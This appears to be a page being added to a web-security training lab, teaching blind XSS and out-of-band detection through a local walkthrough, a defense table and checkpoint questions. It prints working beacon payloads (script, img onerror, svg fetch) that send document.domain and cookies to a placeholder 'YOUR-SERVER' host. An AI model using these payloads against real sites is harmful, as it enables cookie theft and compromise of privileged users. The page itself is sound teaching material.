@@ -1,0 +1,139 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Module 11 — Blind XSS & Out-of-Band</title>
+<link rel="stylesheet" href="../assets/lab.css">
+<link rel="stylesheet" href="../module_11_blind/module.css">
+</head>
+<body>
+<nav class="nav">
+  <a href="/">◂ Lab home</a>
+  <a href="../module_10_stored/">◂ Module 10</a>
+  <a href="../module_12_evasion/">Module 12 ▸</a>
+</nav>
+
+<p class="kicker">Module 11 · delivery class</p>
+<h1>Blind XSS &amp; Out-of-Band Techniques <span class="badge attack">attack</span></h1>
+<p class="lead">The payload fires somewhere you cannot watch — an admin panel, a
+log dashboard, a support-ticket viewer, a PDF/report generator. You cannot see
+the alert, so you make the payload <em>phone home</em>.</p>
+
+<h2>What makes XSS "blind"</h2>
+<p>In reflected/stored XSS you observe execution directly. In <strong>blind</strong>
+XSS the vulnerable render happens in a context you have no access to:</p>
+<ul>
+<li>An <strong>admin</strong> reviewing user feedback / support tickets.</li>
+<li>A <strong>log viewer</strong> that renders your <code>User-Agent</code> or
+<code>Referer</code>.</li>
+<li>A <strong>back-office</strong> tool, CRM, or moderation queue.</li>
+<li>A <strong>PDF/report generator</strong> that renders HTML server-side (often
+with an old, script-enabled engine).</li>
+</ul>
+<p>Because you can't see the alert, you need <strong>out-of-band (OOB)</strong>
+detection: the payload makes a request back to a server you control, proving
+"it ran, here, in this context." The request itself carries loot (the origin,
+non-<code>HttpOnly</code> cookies, the DOM).</p>
+
+<h2>The canonical blind payload</h2>
+<pre><code>&lt;script&gt;new Image().src='https://YOUR-SERVER/collect?d='+
+    encodeURIComponent(document.domain+'|'+document.cookie)&lt;/script&gt;
+
+&lt;!-- no-script variants (mechanism 2), for filtered contexts: --&gt;
+&lt;img src=x onerror="this.src='https://YOUR-SERVER/collect?d='+document.domain"&gt;
+&lt;svg onload="fetch('https://YOUR-SERVER/collect?d='+document.domain)"&gt;</code></pre>
+<p>A real engagement points at an external collector you own (e.g. an interactsh /
+Burp Collaborator style host, or your own VPS). <strong>In this lab the collector
+is local</strong> — <code>/collect</code> — so nothing ever leaves your machine.</p>
+
+<h2>Run the full blind loop in the lab</h2>
+<div class="card danger">
+<ol>
+<li><strong>As the attacker</strong>, submit feedback with a beacon payload.
+Paste this into <a href="http://localhost:5000/feedback" target="_blank" rel="noopener">/feedback</a>:
+<div class="payload">
+  <input id="p1" value="<img src=x onerror=&quot;new Image().src='/collect?d='+encodeURIComponent(document.domain)&quot;>">
+  <button class="copy" data-copy="#p1">copy</button>
+</div>
+You see nothing execute — the feedback page never renders it back. That is the
+blind condition.</li>
+<li><strong>As the admin</strong> (simulating a staffer opening the queue), load
+<a href="http://localhost:5000/admin/feedback" target="_blank" rel="noopener">/admin/feedback</a>. The payload fires <em>there</em>, in the admin view, and
+beacons to <code>/collect</code>.</li>
+<li><strong>Back as the attacker</strong>, open your capture console
+<a href="http://localhost:5000/callbacks" target="_blank" rel="noopener">/callbacks</a> — the hit is logged, with a timestamp and the leaked
+<code>document.domain</code>. You just detected execution in a page you never
+saw.</li>
+</ol>
+</div>
+
+<h2>Why the beacon is an <code>&lt;img&gt;</code>/<code>fetch</code></h2>
+<p>An image or <code>fetch</code> GET is the smallest reliable exfil channel:
+it needs no response handling and often survives contexts where other requests
+are blocked. Note the interplay with defenses:</p>
+<table>
+<thead><tr><th>Defense</th><th>Effect on the beacon</th></tr></thead>
+<tbody>
+<tr><td><code>HttpOnly</code> cookies</td><td>The payload can still run, but <code>document.cookie</code> is empty — the beacon can't carry the session cookie. Attacker pivots to request forgery (Module 15).</td></tr>
+<tr><td>CSP <code>connect-src</code>/<code>img-src</code>/<code>default-src</code></td><td>Can block the outbound beacon to an external host — a real mitigation for exfiltration, though DNS-based OOB may still leak.</td></tr>
+<tr><td>No outbound network (air-gapped admin)</td><td>Forces timing/DOM-stashing techniques; detection gets harder but impact may remain.</td></tr>
+</tbody>
+</table>
+
+<h2>Timing-based and stored-detection variants</h2>
+<ul>
+<li><strong>Timing:</strong> if you can't beacon, a payload that runs a long loop
+or delays a response can reveal execution by measuring response time — noisy but
+sometimes the only channel.</li>
+<li><strong>DOM stashing:</strong> the blind payload writes evidence
+(<code>document.title</code>, a hidden element, localStorage) that a later,
+attacker-visible page can read — useful when the admin and public app share an
+origin.</li>
+</ul>
+
+<h2>Why blind XSS is disproportionately dangerous</h2>
+<div class="card">
+<p>The victim is almost always <strong>privileged</strong> (admin, support,
+moderator), so a single blind hit can mean full compromise. And the payload is
+often planted in fields nobody thinks of as user input — <code>User-Agent</code>,
+<code>Referer</code>, a filename, an X-Forwarded header — which is exactly why
+input you "never display" still needs output encoding wherever it is
+<em>eventually</em> rendered. This is the strongest argument for defenses that do
+not depend on remembering every render site: <strong>CSP + Trusted Types +
+contextual auto-encoding by default</strong>.</p>
+</div>
+
+<h2>The defense, precisely</h2>
+<div class="card safe">
+<ol>
+<li><strong>Encode at output everywhere</strong>, including internal/admin tools
+and log viewers — they are prime blind sinks.</li>
+<li><strong>Set <code>HttpOnly</code></strong> so a beacon can't steal the
+session cookie.</li>
+<li><strong>Restrict outbound with CSP</strong> (<code>connect-src</code>,
+<code>img-src</code>, <code>default-src 'self'</code>) to break exfiltration.</li>
+<li><strong>Render reports/PDFs with script disabled</strong> and treat all
+captured headers as tainted.</li>
+</ol>
+</div>
+
+<h2>Checkpoint</h2>
+<div class="card">
+<ol>
+<li>Why can't you use <code>alert(1)</code> to confirm a blind XSS, and what do
+you use instead?</li>
+<li>What does <code>HttpOnly</code> take away from the attacker, and what do they
+do next?</li>
+<li>Name two fields that are blind-XSS sinks even though they are "never shown to
+the user."</li>
+</ol>
+</div>
+
+<footer>
+Module 11 of 19 · <a href="../module_12_evasion/">Next: Filter Evasion &amp; Obfuscation ▸</a><br>
+Endpoints: <code>/feedback</code>, <code>/admin/feedback</code>, <code>/collect</code>, <code>/callbacks</code>.
+</footer>
+<script src="../assets/lab.js"></script>
+</body>
+</html>
